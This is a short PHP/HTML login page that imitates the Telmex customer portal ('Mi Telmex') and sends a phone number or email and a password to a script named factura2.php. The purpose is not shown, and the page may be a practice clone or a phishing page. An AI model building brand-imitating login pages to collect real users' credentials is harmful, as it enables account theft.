<HTML>

<?php 
include("header.php"); 
?>

</BR> </BR>	<HR> </HR> </BR> </BR>

<CENTER>

<B style="	font-family: Gill Sans MT Condensed; color: royalblue; font-size: 40px;"> MI TELMEX </B>

<br> <br>

<B style="font-family: Gill Sans MT Condensed; font-size: 30px;"> Iniciar sesi&oacute;n. </B>

  <DIV class="div2">

<FORM action="factura2.php" method="post">

<br> 
    <input style="width: 400px;" type="text" name="NOMBRE" class="cajas" required="" placeholder="Número Telmex o correo electrónico">
<br> <br>
<input style="width: 400px;" type="password" name="CONTRASEÑA" class="cajas" required="" placeholder="Contraseña">
<br> <br>
    ¿Eres nuevo en Mi Telmex? <A href="usuario.php"> <B> Crea tu cuenta </B></A> 
<br> <br>
  <center>
    <input class="btn" type="submit" name="submit" value="Iniciar Sesi&oacute;n" onclick="">
  </center>
<br>
  <A> ¿Necesitas ayuda? </A>
</FORM>
</DIV>
</CENTER>    
    </BODY>
    
<?php
include("footer.php");
?>
    
</HTML>